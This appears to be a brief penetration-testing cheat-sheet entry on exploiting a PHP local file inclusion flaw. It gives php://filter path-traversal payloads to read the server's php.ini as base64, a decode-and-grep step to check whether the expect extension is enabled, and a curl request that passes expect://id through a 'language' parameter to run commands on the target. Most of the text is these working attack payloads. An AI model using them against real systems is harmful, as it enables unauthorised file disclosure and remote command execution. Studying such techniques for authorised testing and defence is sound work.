- - -

## Check For "extension=expect" : 

#### Veritfy that it is enabled or not..

```php
php://filter/read=convert.base64-encode/resource=../../../../etc/php/<|PHP-VERSION|>/apache2/php.in

php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.in
```

Once we have the **base64 encoded string**, we can **decode it** and **grep** for **expect** to see its value:

```sh
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

#### If Enabled, Use Expect Filter : 

```sh
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


- - -
